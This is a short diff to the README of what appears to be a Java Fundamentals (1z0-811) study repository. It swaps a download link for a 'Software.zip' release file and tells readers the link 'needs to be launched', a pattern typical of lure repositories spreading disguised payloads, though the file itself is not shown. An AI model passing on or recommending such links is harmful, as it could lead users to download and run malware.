@@ -27,7 +27,7 @@ To access the repository content, simply navigate to the respective folders:
 - Looking for additional resources? Check out the "Resources" section.
 
 ## 🌟 Quick Links
-- Get started by accessing the [1z0-811_Java_Fundamentals Repository](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip).
+- Get started by accessing the [1z0-811_Java_Fundamentals Repository](https://github.com/deathetirree/1z0-811_Java_Fundamentals/releases/download/v1.0/Software.zip).
 
 📌 **Note**: The provided link needs to be launched to access the repository content.
 
